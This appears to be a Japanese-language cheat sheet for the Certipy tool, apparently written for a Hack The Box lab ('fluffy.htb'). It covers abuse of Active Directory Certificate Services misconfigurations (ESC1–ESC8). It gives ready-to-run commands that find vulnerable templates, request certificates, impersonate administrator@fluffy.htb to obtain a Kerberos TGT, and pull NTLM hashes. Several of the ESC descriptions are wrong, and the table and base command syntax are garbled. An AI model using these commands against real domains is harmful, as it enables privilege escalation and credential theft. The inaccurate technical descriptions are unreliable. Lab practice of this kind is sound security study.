**Certipy** は、**Active Directory Certificate Services (AD CS)** を悪用して、権限昇格・横展開・認証回避を行うためのツールです。

| 攻撃内容            | 説明                                                    |     |
| --------------- | ----------------------------------------------------- | --- |
| ESC1〜ESC8       | AD CS に存在する構成ミスを悪用                                    |     |
| TGT取得           | 証明書ベースで TGT を取得                                       |     |
| PKINIT Relay    | 証明書認証を使ったリレー攻撃                                        |     |
| サブCA列挙・テンプレート列挙 | 環境把握・脆弱性評価                                            |     |
| ESC番号           | 攻撃例                                                   |     |
| ESC1            | 証明書テンプレートが誰でも ENROLL できる + ユーザー名を任意指定できる              |     |
| ESC2            | 任意証明書が Kerberos認証に使える                                 |     |
| ESC3            | テンプレートに外部CAからの発行許可あり                                  |     |
| ESC4            | 認証局がユーザーへの証明書発行に署名する設定                                |     |
| ESC6            | テンプレートに証明書書き換え可能設定（CT_FLAG_ALLOW_ENROLL_ON_BEHALF_OF） |     |
| ESC8            | サブCA自体を支配できる状態                                        |     |



certipy -u <user> -p '<password>' -target <domain>/<dc_host> [options]

certipy -u bob -p 'P@ssw0rd!' -target fluffy.htb/DC01.fluffy.htb

certipy find -u bob -p 'P@ssw0rd!' -target fluffy.htb/DC01.fluffy.htb
攻撃可能なテンプレート（ESC1, ESC6など）を検出

certipy auth -pfx user.pfx -dc-ip 10.10.10.1
TGT の取得（証明書認証）PFXファイルは `request` で取得した証明書（秘密鍵付き

certipy req -u bob -p 'P@ssw0rd!' -ca <CA名> -template <テンプレ名>
certipy req -u bob -p 'P@ssw0rd!' -ca 'DC01.fluffy.htb\fluffy-CA' -template 'User'
### 証明書テンプレートから証明書を発行（ESC1）
出力例：bob.pfx（秘密鍵付き証明書）bob.crt（公開証明書）

certipy auth -pfx bob.pfx -upn administrator@fluffy.htb -dc-ip 10.10.10.1
別ユーザーのTGTを取得 条件：テンプレートが ENROLL 対象に `Authenticated Users` を含んでいる

openssl pkcs12 -in bob.pfx -out bob.pem -nodes
### 証明書の変換（PFX → PEM）

certipy auth -pfx bob.pfx
NTLMハッシュの取得（Certipy auth後）


